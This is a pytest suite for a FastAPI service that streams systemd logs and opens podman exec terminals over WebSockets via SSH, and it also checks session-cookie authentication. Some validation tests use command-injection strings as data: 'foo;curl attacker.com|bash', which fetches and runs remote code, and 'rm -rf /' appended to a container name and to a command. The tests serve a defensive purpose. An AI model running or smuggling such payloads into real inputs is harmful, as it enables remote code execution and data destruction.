import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi import WebSocket, WebSocketDisconnect
from api.sockets import ConnectionManager, stream_logs_over_websocket, exec_terminal_over_websocket
from api import routes as api_routes
from services.ssh_manager import pool

@pytest.fixture
def mock_websocket():
    ws = AsyncMock(spec=WebSocket)
    return ws

@pytest.mark.asyncio
async def test_connection_manager(mock_websocket):
    cm = ConnectionManager()
    await cm.connect(mock_websocket)
    assert mock_websocket in cm.active_connections
    mock_websocket.accept.assert_called_once()
    
    await cm.broadcast("test msg")
    mock_websocket.send_text.assert_called_with("test msg")
    
    cm.disconnect(mock_websocket)
    assert mock_websocket not in cm.active_connections

@pytest.mark.asyncio
async def test_stream_logs_over_websocket_disconnect(mock_websocket, monkeypatch):
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()
    
    async def mock_stdout():
        yield "log line 1\n"
        yield "log line 2\n"

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    
    monkeypatch.setattr("api.sockets.pool", mock_pool)
    
    mock_websocket.receive_text.side_effect = WebSocketDisconnect()
    
    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="my_unit.service")
    
    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once_with("journalctl --user -u my_unit.service -f -n 100")
    
    mock_process.terminate.assert_called_once()
    mock_process.wait.assert_awaited_once_with(check=False)

@pytest.mark.asyncio
async def test_stream_logs_over_websocket_stop_command(mock_websocket, monkeypatch):
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()

    async def empty_stdout():
        if False:
            yield ""

    mock_process.stdout = empty_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.return_value = "STOP"

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="my_unit.service")

    mock_process.terminate.assert_called_once()
    mock_process.wait.assert_awaited_once_with(check=False)


@pytest.mark.asyncio
async def test_exec_terminal_over_websocket_disconnect(mock_websocket, monkeypatch):
    """Test that terminal process is properly cleaned up on WebSocket disconnect"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()
    mock_process.stdout.read = AsyncMock(side_effect=["container output\n", ""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once()

    # Verify PTY was requested
    call_kwargs = mock_conn.create_process.call_args[1]
    assert call_kwargs.get('request_pty') is True
    assert call_kwargs.get('term_type') == 'xterm-256color'

    mock_process.kill.assert_called()
    mock_process.wait.assert_awaited()


@pytest.mark.asyncio
async def test_exec_terminal_forward_input(mock_websocket, monkeypatch):
    """Test that terminal input is forwarded to process stdin"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_stdin = MagicMock()
    mock_process.stdin = mock_stdin
    mock_process.stdout.read = AsyncMock(side_effect=["$ ", ""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # Send input to terminal
    mock_websocket.receive_text.side_effect = ["ls\n", WebSocketDisconnect()]

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # Verify input was written to stdin as a string (not bytes).
    # asyncssh text mode (encoding='utf-8') expects str; passing bytes raises
    # AttributeError and drops the connection.
    mock_stdin.write.assert_called_once_with("ls\n")


@pytest.mark.asyncio
async def test_exec_terminal_resize_event(mock_websocket, monkeypatch):
    """Test that terminal resize events are handled"""
    import json

    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.set_terminal_size = MagicMock()
    mock_process.stdin = MagicMock()
    mock_process.stdout.read = AsyncMock(side_effect=["output", ""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # Send resize event
    resize_event = json.dumps({"type": "resize", "cols": 120, "rows": 40})
    mock_websocket.receive_text.side_effect = [resize_event, WebSocketDisconnect()]

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # Verify resize was called
    mock_process.set_terminal_size.assert_called_once_with(120, 40)


@pytest.mark.asyncio
async def test_exec_terminal_with_custom_command(mock_websocket, monkeypatch):
    """Test that custom commands are passed to podman exec"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()
    mock_process.stdout.read = AsyncMock(side_effect=[""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn

    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="python")

    # Verify correct command was executed
    call_args = mock_conn.create_process.call_args[0]
    assert "podman exec -it myapp python" in call_args[0]


@pytest.mark.asyncio
async def test_stream_logs_rejects_invalid_unit_name(mock_websocket, monkeypatch):
    """Test that injected chars in unit_name are rejected before process is started"""
    mock_pool = AsyncMock()
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="foo;curl attacker.com|bash")

    mock_pool.get_connection.assert_not_called()
    mock_websocket.send_text.assert_called_once()
    sent = mock_websocket.send_text.call_args[0][0]
    assert "invalid" in sent.lower() or "error" in sent.lower()


@pytest.mark.asyncio
async def test_exec_terminal_rejects_invalid_container_name(mock_websocket, monkeypatch):
    """Test that injected chars in container_name are rejected before process is started"""
    mock_pool = AsyncMock()
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="foo&&rm -rf /", scope="user", cmd="bash")

    mock_pool.get_connection.assert_not_called()
    mock_websocket.send_text.assert_called_once()
    sent = mock_websocket.send_text.call_args[0][0]
    assert "invalid" in sent.lower() or "error" in sent.lower()


@pytest.mark.asyncio
async def test_exec_terminal_cmd_injection_is_quoted(mock_websocket, monkeypatch):
    """Test that shell metacharacters in cmd are quoted, not interpreted"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()
    mock_process.stdout.read = AsyncMock(side_effect=[""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(
        mock_websocket, server_id=1, container_name="myapp", scope="user",
        cmd="bash;rm -rf /"
    )

    call_args = mock_conn.create_process.call_args[0]
    built_cmd = call_args[0]
    # Semicolon must be quoted — it must not appear as a bare shell separator
    assert "'bash;rm" in built_cmd or '"bash;rm' in built_cmd


@pytest.mark.asyncio
async def test_stream_logs_valid_unit_name_passes(mock_websocket, monkeypatch):
    """Test that valid systemd unit names (including template instances) still work"""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.terminate = MagicMock()

    async def mock_stdout():
        if False:
            yield ""

    mock_process.stdout = mock_stdout()
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    mock_websocket.receive_text.return_value = "STOP"

    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="myapp@1.service")

    mock_pool.get_connection.assert_called_once_with(1)
    mock_conn.create_process.assert_called_once()


# ── Authentication tests for WebSocket route handlers ──────────────────────

@pytest.fixture
def unauth_ws():
    ws = AsyncMock(spec=WebSocket)
    ws.cookies = {}
    return ws


@pytest.fixture
def authed_ws():
    ws = AsyncMock(spec=WebSocket)
    valid_cookie = api_routes._create_session_cookie("alice", "editor", is_admin=False)
    ws.cookies = {api_routes.COOKIE_NAME: valid_cookie}
    return ws


@pytest.mark.asyncio
async def test_ws_logs_rejects_unauthenticated(unauth_ws, monkeypatch):
    """Unauthenticated /ws/logs connections must be closed before streaming starts."""
    monkeypatch.setattr(api_routes.global_config, "dev_auto_login", False)
    called = {"hit": False}

    async def fake_stream(*args, **kwargs):
        called["hit"] = True

    monkeypatch.setattr(api_routes, "stream_logs_over_websocket", fake_stream)

    await api_routes.websocket_logs(unauth_ws, server_id=1, unit_name="my.service")

    unauth_ws.close.assert_awaited_once()
    assert unauth_ws.close.call_args.kwargs.get("code") == 4401 or unauth_ws.close.call_args.args == (4401,)
    assert called["hit"] is False


@pytest.mark.asyncio
async def test_ws_exec_rejects_unauthenticated(unauth_ws, monkeypatch):
    """Unauthenticated /ws/exec connections must be closed before streaming starts."""
    monkeypatch.setattr(api_routes.global_config, "dev_auto_login", False)
    called = {"hit": False}

    async def fake_exec(*args, **kwargs):
        called["hit"] = True

    monkeypatch.setattr(api_routes, "exec_terminal_over_websocket", fake_exec)

    await api_routes.websocket_exec(unauth_ws, server_id=1, container_name="myapp")

    unauth_ws.close.assert_awaited_once()
    assert called["hit"] is False


@pytest.mark.asyncio
async def test_ws_logs_accepts_valid_session(authed_ws, monkeypatch):
    """A valid signed session cookie must allow the log stream handler to run."""
    monkeypatch.setattr(api_routes.global_config, "dev_auto_login", False)
    called = {"hit": False}

    async def fake_stream(ws, server_id, unit_name, scope):
        called["hit"] = True

    monkeypatch.setattr(api_routes, "stream_logs_over_websocket", fake_stream)

    await api_routes.websocket_logs(authed_ws, server_id=1, unit_name="my.service")

    authed_ws.close.assert_not_called()
    assert called["hit"] is True


@pytest.mark.asyncio
async def test_ws_exec_accepts_valid_session(authed_ws, monkeypatch):
    """A valid signed session cookie must allow the exec terminal handler to run."""
    monkeypatch.setattr(api_routes.global_config, "dev_auto_login", False)
    called = {"hit": False}

    async def fake_exec(ws, server_id, container_name, scope, cmd):
        called["hit"] = True

    monkeypatch.setattr(api_routes, "exec_terminal_over_websocket", fake_exec)

    await api_routes.websocket_exec(authed_ws, server_id=1, container_name="myapp")

    authed_ws.close.assert_not_called()
    assert called["hit"] is True


@pytest.mark.asyncio
async def test_exec_terminal_sends_prompt_without_newline(mock_websocket, monkeypatch):
    """PTY shell prompts have no trailing newline.  The terminal must forward them
    immediately via read(), not stall in readline() waiting for '\\n'.

    This was the root cause of issue #100: bash IS available, connects, but the
    terminal screen stays blank because the initial prompt never arrived.
    """
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()

    # Simulate: PTY emits the bash prompt (no newline), then EOF
    mock_process.stdout.read = AsyncMock(side_effect=["root@container:/# ", ""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # TimeoutError first so asyncio.sleep(0) yields to read_output; then disconnect
    mock_websocket.receive_text.side_effect = [asyncio.TimeoutError(), WebSocketDisconnect()]

    await exec_terminal_over_websocket(
        mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash"
    )

    all_sent = [call[0][0] for call in mock_websocket.send_text.call_args_list]
    assert any("root@container" in msg for msg in all_sent), (
        f"Shell prompt (no newline) must be forwarded via read(), got: {all_sent}"
    )


@pytest.mark.asyncio
async def test_exec_terminal_notifies_on_process_exit(mock_websocket, monkeypatch):
    """When the remote process exits unexpectedly, the client receives a
    notification message and the websocket is closed cleanly."""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()

    # Stdout exhausts immediately — simulates process exiting right after launch
    mock_process.stdout.read = AsyncMock(side_effect=[""])
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # receive_text times out on the first call (yields to event loop so
    # read_output can run and set process_done), then disconnects to end test
    mock_websocket.receive_text.side_effect = [asyncio.TimeoutError(), WebSocketDisconnect()]

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # A notification message containing "exited" must have been sent
    all_sent = [call[0][0] for call in mock_websocket.send_text.call_args_list]
    assert any("exited" in msg.lower() or "process" in msg.lower() for msg in all_sent), (
        f"Expected a process-exit notification but got: {all_sent}"
    )


@pytest.mark.asyncio
async def test_exec_terminal_no_spurious_notification_on_client_disconnect(mock_websocket, monkeypatch):
    """When the client disconnects normally (not process exit), no process-exit
    notification should be sent."""
    mock_pool = AsyncMock()
    mock_conn = AsyncMock()
    mock_process = AsyncMock()
    mock_process.kill = MagicMock()
    mock_process.stdin = MagicMock()

    # Stdout blocks indefinitely — process is still "running"
    stdout_block = asyncio.Event()  # never set; read() blocks until task is cancelled

    async def blocking_read(n):
        await stdout_block.wait()
        return ""

    mock_process.stdout.read = blocking_read
    mock_conn.create_process.return_value = mock_process
    mock_pool.get_connection.return_value = mock_conn
    monkeypatch.setattr("api.sockets.pool", mock_pool)

    # Client disconnects on first receive
    mock_websocket.receive_text.side_effect = WebSocketDisconnect()

    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="myapp", scope="user", cmd="bash")

    # No process-exit notification should have been sent
    all_sent = [call[0][0] for call in mock_websocket.send_text.call_args_list]
    assert not any("exited" in msg.lower() for msg in all_sent), (
        f"Unexpected process-exit notification sent on client disconnect: {all_sent}"
    )


@pytest.mark.asyncio
async def test_ws_logs_dev_auto_login_bypasses_auth(unauth_ws, monkeypatch):
    """When dev_auto_login is enabled, missing cookies must not block the stream."""
    monkeypatch.setattr(api_routes.global_config, "dev_auto_login", True)
    called = {"hit": False}

    async def fake_stream(*args, **kwargs):
        called["hit"] = True

    monkeypatch.setattr(api_routes, "stream_logs_over_websocket", fake_stream)

    await api_routes.websocket_logs(unauth_ws, server_id=1, unit_name="my.service")

    unauth_ws.close.assert_not_called()
    assert called["hit"] is True
